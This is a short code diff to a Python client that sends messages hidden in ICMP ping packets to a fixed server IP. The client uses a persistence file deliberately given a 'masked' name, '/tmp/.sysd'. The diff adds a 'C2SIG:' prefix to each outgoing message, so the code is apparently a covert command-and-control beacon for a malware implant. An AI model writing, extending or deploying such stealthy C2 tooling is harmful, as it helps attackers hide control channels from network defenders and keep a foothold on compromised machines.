@@ -12,6 +12,7 @@ SERVER_IP = "192.168.108.137" # IP addr of whatever the server script is running
 INTERVAL = 1
 CLIENT_ID = random.randint(1000, 9999)
 PERSISTENT_PATH = "/tmp/.sysd"  # More masked name
+C2_PREFIX = "C2SIG:"
 
 def checksum(data):
     """Calculate ICMP checksum for packet validity"""
@@ -39,7 +40,8 @@ def create_icmp_packet(seq, payload):
 
 def send_ping(sock, seq, message):
     """Send ICMP packet to server with embedded message"""
-    packet = create_icmp_packet(seq, message)
+    prefixed_message = C2_PREFIX + message
+    packet = create_icmp_packet(seq, prefixed_message)
     try:
         sock.sendto(packet, (SERVER_IP, 1))
     except Exception:
